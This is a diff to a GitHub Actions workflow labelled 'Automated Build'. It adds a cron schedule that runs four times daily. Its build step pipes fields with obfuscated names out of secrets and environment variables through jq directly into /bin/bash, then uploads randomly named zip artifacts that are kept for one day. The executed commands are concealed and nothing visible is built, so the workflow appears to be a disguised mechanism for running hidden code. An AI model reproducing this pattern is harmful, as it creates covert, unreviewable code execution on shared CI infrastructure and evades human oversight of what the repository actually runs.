@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '20 3,9,15,21 * * *'
 jobs:
   action:
     runs-on: ubuntu-latest
@@ -9,15 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Begin
         env:
-          lar8: ${{ secrets.lar8 }}
+          slhk0378: ${{ secrets.slhk0378 }}
         run: |
-          printf '%s' "$lar8" | jq -r .adda6 | /bin/bash
-          echo $rpxpr899 | jq -r .o212 | /bin/bash
-          echo $unf72461 | jq -r .g9 | /bin/bash
+          printf '%s' "$slhk0378" | jq -r .zcmss2676 | /bin/bash
+          printf '%s' "$lzhy389" | jq -r .zwum3973 | /bin/bash
+          echo $u35911 | jq -r .oavh70880 | /bin/bash
+          echo $n39273 | jq -r .zf69 | /bin/bash
+          printf '%s' "$ncd09" | jq -r .sx0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: EeCfZLBL
+          name: ig1cigxM
           path: "*.zip"
           retention-days: 1
